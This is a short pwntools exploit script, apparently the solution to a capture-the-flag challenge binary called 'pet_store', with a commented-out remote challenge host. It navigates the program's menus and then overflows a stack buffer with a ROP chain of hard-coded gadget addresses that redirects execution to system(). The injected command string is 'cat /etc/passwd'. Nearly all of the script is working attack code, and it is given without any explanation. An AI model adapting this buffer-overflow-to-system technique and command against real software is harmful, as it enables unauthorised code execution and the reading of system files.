from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('pet_store')
r= e.process()
# r = remote('chall.polygl0ts.ch',9001)
lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')
mov_rdi_rax_puts_leave_ret =0x401DDC
# 0x0000000000401247 #: mov edi, 0x404098 ; jmp rax
main =0x0000000000401e8f
ret     = 0x40101a
sysplt  = 0x401140
sysgot =0x404030
leave_ret= 0x401E8D
puts_plt =0x401120
payload = b"cat /etc/passwd\x00".ljust(64,b"a")
r.sendafter(b"name:", payload)
r.sendlineafter(b">> ", b"1")
r.sendlineafter(b">> ", b"1")
r.sendlineafter(b">> ", b"4")
r.sendlineafter(b"feed:", b"0")

r.sendlineafter(b">> ", b"5")
r.sendlineafter(b"with: ", b"0")

payload = payload.ljust((0xA0+8),b"\x00" )
payload +=flat(0x00000000004012bd,0x4040e0,0x00000000004012f2)
pause()
r.sendlineafter(b"pet: \n", payload)

# r.sendlineafter(b"[y/n]: ", b"n")

r.interactive()